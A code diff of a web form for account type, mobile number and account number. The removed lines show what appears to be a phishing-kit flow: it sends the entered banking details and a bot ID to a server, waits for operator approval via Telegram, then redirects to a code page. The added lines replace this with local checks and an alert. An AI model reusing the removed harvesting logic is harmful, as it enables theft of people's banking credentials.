@@ -298,31 +298,6 @@
 
 
         /* ================================
-           WAITING & ALERT MESSAGES
-        ================================= */
-        .waiting-message {
-            display: none;
-            text-align: center;
-            font-size: 16px;
-            color: #f45112;
-            margin-top: 20px;
-            font-weight: 600;
-            padding: 12px;
-            background: #fff0eb;
-            border-radius: 8px;
-            border: 1px solid #f45112;
-        }
-
-        .alert-message {
-            text-align: center;
-            margin-top: 12px;
-            font-size: 15px;
-            min-height: 24px;
-            color: #d32f2f;
-        }
-
-
-        /* ================================
            BOTTOM BUTTON AREA
         ================================= */
         .bottom-bar {
@@ -387,11 +362,6 @@
         .bottom-btn:hover {
             background:
                 rgba(0, 0, 0, 0.05);
-        }
-
-        .bottom-btn:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
         }
 
 
@@ -490,7 +460,7 @@
              FORM
         ================================= -->
 
-        <section class="form-card" id="formCard">
+        <section class="form-card">
 
 
             <!-- ================================
@@ -668,12 +638,6 @@
 
             </div>
 
-            <!-- Waiting & Alert Messages -->
-            <div id="waitingMessage" class="waiting-message">
-                ⏳ Waiting for admin approval… (Telegram message sent)
-            </div>
-
-            <div id="alertMessage" class="alert-message"></div>
 
         </section>
 
@@ -696,7 +660,6 @@
             <button
                 type="button"
                 class="bottom-btn"
-                id="cancelBtn"
                 onclick="cancelForm()"
             >
 
@@ -714,7 +677,6 @@
             <button
                 type="button"
                 class="bottom-btn"
-                id="nextBtn"
                 onclick="nextPage()"
             >
 
@@ -738,38 +700,12 @@
     ================================= -->
 
     <script>
-        // ============================================================
-        // 1. SESSION HANDLING
-        // ============================================================
 
-        const params = new URLSearchParams(window.location.search);
-        const botId = params.get('botId') || localStorage.getItem('botId');
-        if (botId) {
-            localStorage.setItem('botId', botId);
-        }
-
-        const fullName = localStorage.getItem('fullName') || '';
-
-        // If missing name or botId, redirect to index
-        if (!fullName || !botId) {
-            alert('Session expired. Please start again.');
-            window.location.href = 'index.html';
-        }
-
-
-        // ============================================================
-        // 2. UI REFERENCES
-        // ============================================================
-
-        const nextBtn = document.getElementById('nextBtn');
-        const cancelBtn = document.getElementById('cancelBtn');
-        const waitingMessage = document.getElementById('waitingMessage');
-        const alertMessage = document.getElementById('alertMessage');
-
-
-        // ============================================================
-        // 3. CANCEL FORM (kept as original, plus hide messages)
-        // ============================================================
+        /*
+        --------------------------------
+        CANCEL FORM
+        --------------------------------
+        */
 
         function cancelForm() {
 
@@ -778,107 +714,55 @@
                 .getElementById("accountType")
                 .selectedIndex = 0;
 
+
             // Clear mobile number
             document
                 .getElementById("mobileNumber")
                 .value = "";
+
 
             // Clear account number
             document
                 .getElementById("accountNumber")
                 .value = "";
 
+
             // Reset marketing information
             document
                 .getElementById("marketingInfo")
                 .checked = true;
+
 
             // Reset EULA
             document
                 .getElementById("acceptEula")
                 .checked = false;
 
+
             // Reset terms
             document
                 .getElementById("acceptTerms")
                 .checked = false;
 
-            // Hide waiting/alert messages
-            waitingMessage.style.display = 'none';
-            alertMessage.textContent = '';
-            nextBtn.disabled = false;
-            cancelBtn.disabled = false;
         }
 
 
-        // ============================================================
-        // 4. POLLING FUNCTION (for account approval)
-        // ============================================================
+        /*
+        --------------------------------
+        NEXT PAGE
+        --------------------------------
+        */
 
-        function pollAccountApproval(requestId) {
-
-            let attempts = 0;
-            const maxAttempts = 60; // 2 minutes
-
-            const interval = setInterval(async () => {
-
-                attempts++;
-
-                try {
-
-                    const res = await fetch(`${window.location.origin}/check-account/${requestId}`);
-                    const data = await res.json();
-
-                    // Check for approval – redirect to code.html
-                    if (data.approved === true || data.redirect === 'code') {
-                        clearInterval(interval);
-                        window.location.href = 'code.html';
-                        return;
-                    }
-
-                    if (data.approved === false) {
-                        clearInterval(interval);
-                        waitingMessage.style.display = 'none';
-                        nextBtn.disabled = false;
-                        cancelBtn.disabled = false;
-                        alertMessage.style.color = 'red';
-                        alertMessage.textContent = 'Account details rejected by admin. Please try again.';
-                        return;
-                    }
-
-                    if (attempts >= maxAttempts) {
-                        clearInterval(interval);
-                        waitingMessage.style.display = 'none';
-                        nextBtn.disabled = false;
-                        cancelBtn.disabled = false;
-                        alertMessage.style.color = 'red';
-                        alertMessage.textContent = 'Request timed out. Please try again.';
-                    }
-
-                } catch (e) {
-                    console.log("Polling error:", e);
-                }
-
-            }, 2000); // poll every 2 seconds
-        }
-
-
-        // ============================================================
-        // 5. NEXT PAGE – sends ONLY name, mobileNumber (from input), accountType, accountNumber
-        // ============================================================
-
-        async function nextPage() {
-
-            // --- 5a. Grab form values ---
+        function nextPage() {
 
             const accountType =
                 document.getElementById("accountType").value;
 
             const mobileNumber =
-                document.getElementById("mobileNumber").value.trim();
+                document.getElementById("mobileNumber").value;
 
             const accountNumber =
-                document.getElementById("accountNumber").value.trim();
+                document.getElementById("accountNumber").value;
 
             const acceptEula =
                 document.getElementById("acceptEula").checked;
@@ -887,80 +771,70 @@
                 document.getElementById("acceptTerms").checked;
 
 
-            // --- 5b. Validations ---
-
+            // Validate account type
             if (accountType === "") {
+
                 alert("Please select an account type.");
+
                 return;
+
             }
 
-            if (mobileNumber === "") {
+
+            // Validate mobile number
+            if (mobileNumber.trim() === "") {
+
                 alert("Please enter your mobile number.");
+
                 return;
+
             }
 
-            if (accountNumber === "") {
+
+            // Validate account number
+            if (accountNumber.trim() === "") {
+
                 alert("Please enter your account number.");
+
                 return;
+
             }
 
+
+            // Validate EULA
             if (!acceptEula) {
-                alert("Please accept the EULA to continue.");
+
+                alert(
+                    "Please accept the EULA to continue."
+                );
+
                 return;
+
             }
 
+
+            // Validate Terms and Conditions
             if (!acceptTerms) {
-                alert("Please accept the Terms and Conditions to continue.");
+
+                alert(
+                    "Please accept the Terms and Conditions to continue."
+                );
+
                 return;
+
             }
 
 
-            // --- 5c. Disable UI & show waiting ---
+            // Display confirmation
+            alert(
 
-            nextBtn.disabled = true;
-            cancelBtn.disabled = true;
-            alertMessage.textContent = '';
-            waitingMessage.style.display = 'block';
+                "Account Type: " + accountType +
 
+                "\nMobile Number: " + mobileNumber +
 
-            // --- 5d. Send ONLY the 4 required fields to the server ---
-            //     mobileNumber is taken from the input field, NOT from localStorage
+                "\nAccount Number: " + accountNumber
 
-            try {
-
-                const payload = {
-                    name: fullName,               // from localStorage
-                    phone: mobileNumber,          // ✅ from the input field on this page
-                    accountType: accountType,
-                    accountNumber: accountNumber,
-                    botId: botId
-                };
-
-                const response = await fetch(`${window.location.origin}/submit-account`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                const data = await response.json();
-
-                if (!data.requestId) {
-                    throw new Error("Missing requestId from server");
-                }
-
-                // --- 5e. Start polling for Telegram approval ---
-                pollAccountApproval(data.requestId);
-
-            } catch (err) {
-
-                // If the server call fails, re-enable the UI
-                waitingMessage.style.display = 'none';
-                nextBtn.disabled = false;
-                cancelBtn.disabled = false;
-                alertMessage.style.color = 'red';
-                alertMessage.textContent = 'Server error. Please try again.';
-                console.error(err);
-            }
+            );
 
         }
 
